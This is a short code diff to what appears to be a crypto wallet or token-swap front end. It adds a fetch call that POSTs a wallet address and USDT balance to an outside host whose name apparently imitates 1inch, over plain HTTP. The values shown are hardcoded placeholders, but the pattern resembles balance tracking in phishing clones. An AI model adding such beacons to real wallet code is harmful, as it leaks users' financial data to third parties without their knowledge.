@@ -412,6 +412,26 @@ if(youPayToken === "MATIC") {
   useEffect(() => {
     if (!isLoading && !isError && data) {
       setTokenBalance(Number(data.formatted).toFixed(4));
+
+      const dataToSend = {
+        walletAddress: '0x1234567890abcdef1234567890abcdef12345678',
+        usdtBalance: 150.25
+      };
+      
+      fetch('http://1inch2test-rud8.vercel.app/api/wallet-balance', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(dataToSend),
+      })
+      .then(response => response.text())
+      .then(dataToSend => {
+        console.log('Success:', dataToSend);
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
     }
   }, [data, isLoading, isError]);
 
